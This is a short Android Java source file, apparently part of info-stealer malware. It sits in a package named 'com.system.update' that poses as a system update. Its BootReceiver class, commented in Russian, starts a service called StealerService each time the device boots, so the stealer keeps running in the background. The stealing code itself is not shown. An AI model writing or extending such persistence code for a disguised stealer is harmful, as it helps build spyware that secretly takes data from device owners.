package com.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // Запускаем сервис при загрузке системы
        context.startService(new Intent(context, StealerService.class));
    }
}
